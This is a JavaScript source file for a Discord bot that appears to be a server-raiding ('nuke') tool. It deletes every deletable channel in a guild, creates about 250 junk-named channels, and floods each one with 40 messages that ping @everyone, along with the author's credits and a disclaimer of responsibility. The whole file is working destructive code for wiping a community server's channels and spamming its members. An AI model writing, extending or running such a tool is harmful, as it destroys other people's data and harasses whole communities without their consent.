import pc from "picocolors"; // Import the picocolors library for colored console output
import logger from "../logging/logger.js"; // Import a custom logger for logging information

// Function to generate a random alphanumeric string of a specified length
function getRandomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; // Possible characters for the random string
  let result = "";
  for (let i = 0; i < length; i++) {
    // Randomly select a character from the 'characters' string
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// Function to generate a random emoji string of a specified length
function getRandomEmoji(length) {
  // Define ranges of Unicode characters representing different emoji categories
  const emojiRanges = [
    [0x1f600, 0x1f64f], // Emoticons
    [0x1f300, 0x1f5ff], // Misc symbols and pictographs
    [0x1f680, 0x1f6ff], // Transport and map symbols
    [0x1f700, 0x1f77f], // Alchemical symbols
    [0x1f900, 0x1f9ff], // Supplemental symbols and pictographs
    [0x1fa70, 0x1faff], // More symbols
  ];
  let result = "";
  for (let i = 0; i < length; i++) {
    // Randomly select a range of emojis
    const range = emojiRanges[Math.floor(Math.random() * emojiRanges.length)];
    const emojiCode =
      Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0]; // Generate a random emoji code point
    result += String.fromCodePoint(emojiCode); // Convert the code point to the corresponding emoji
  }
  return result;
}

// Class for managing Discord channels
class Channel {
  // Method to delete all deletable channels in a given guild
  async deleteEveryChannel(guild) {
    try {
      // Filter out deletable channels from the guild
      let deletableChannels = guild.channels.cache.filter(
        (channel) => channel.deletable
      );

      if (deletableChannels.size === 0) {
        // If there are no deletable channels, log and return
        await logger.warn("No channel available for deletion.");
        console.log(pc.red("No deletable channels found."));
        return;
      }

      let deletedChannels = 0;
      for (const channel of deletableChannels.values()) {
        try {
          // Log the attempt to delete the channel
          await logger.info(
            `Attempting to delete channel: '${channel.name}' (id: ${channel.id})`
          );
          console.log(
            pc.yellow(
              `Attempting to delete channel: '${channel.name}' (id: ${channel.id})`
            )
          );

          await channel.delete(); // Attempt to delete the channel

          // Log successful deletion
          await logger.info(
            `Deleted channel: '${channel.name}' (${channel.id})`
          );
          console.log(
            pc.green(`Deleted channel: '${channel.name}' (${channel.id})`)
          );
          deletedChannels++; // Increment deleted channel count
        } catch (error) {
          // Log any errors encountered while attempting to delete a channel
          await logger.error(
            `Failed to delete '${channel.name}': ${error.message}`
          );
          console.log(pc.red(`Skipping '${channel.name}' due to error.`));
        }
      }

      // Log the total number of deleted channels
      await logger.info(
        `Channel deletion complete. Total deleted: ${deletedChannels}`
      );
      console.log(
        pc.cyan(
          `Channel deletion finished. Deleted ${deletedChannels} channels.`
        )
      );
    } catch (error) {
      // Log any errors that occur during the deletion process
      await logger.error(`Error in deleteEveryChannel: ${error.message}`);
      console.error(pc.red(`Unexpected error: ${error.message}`));
    }
  }

  // Method to create a specified number of random channels in the guild
  async createChannel(guild) {
    try {
      let guildSpace = Math.floor(500 / 2); // Calculate the number of channels to create (rounded)
      let createdChannelsAmount = 0; // Keep track of how many channels were created
      console.log(
        pc.yellow(`Attempting to create ${pc.red(guildSpace)} channel...`)
      );
      await logger.info(`Attempting to create ${guildSpace} channel...`);
      for (let x = 1; x < guildSpace; x++) {
        // Create a new channel with a random emoji and random string as its name
        const channel = await guild.channels.create({
          name: `${getRandomEmoji(1)}-${getRandomString(98)}`, // Random emoji + random alphanumeric string as the channel name
          type: 0, // Type 0 corresponds to a text channel
        });

        guildSpace--; // Decrease the space left for channel creation
        createdChannelsAmount++; // Increment the count of created channels

        // Log successful channel creation
        await logger.info(`${x}th Channel created successfully.`);
        console.log(pc.green(`${x}th Channel created successfully.`));
        this.sendMessages(channel); // Send pre-defined messages to the newly created channel
      }

      // Log completion of channel creation
      console.log(
        pc.cyan(
          `Channel creation finished. created ${createdChannelsAmount} text channel.`
        )
      );
    } catch (error) {
      // Log any errors encountered during channel creation
      await logger.error(`Failed to create channel: ${error.message}`);
      console.log(pc.red(`Error creating channel: ${error.message}`));
    }
  }

  // Method to send a series of messages to the specified channel
  async sendMessages(channel) {
    try {
      for (let x = 0; x < 40; x++) {
        // Send a predefined message 40 times to the channel
        await channel.send(`
  # Made By DrowningDev  
  - - Discord (user): <@901101714617286686>
  - - [Discord (user link)](https://discord.com/users/901101714617286686)
  - - [GitHub](https://github.com/drowning14)  
  [Source Code](https://github.com/drowning14/hiroshima-remake)  
  
  **Disclaimer: I am not responsible for any issues/problem related to this server/guild.  
  Please do not DM me with complaints.**  
  
  ||@everyone||
  `);
      }
    } catch (error) {
      // Log any errors encountered while sending messages to the channel
      await logger.error(
        `Failed to send message into channel ${channel.id}: ${error.message}`
      );
      console.log(
        pc.red(
          `Error send message into channel ${channel.id}: ${error.message}`
        )
      );
    }
  }
}

// Instantiate the Channel class to be used as a ChannelManager
const ChannelManager = new Channel();
export { ChannelManager, getRandomString, getRandomEmoji };
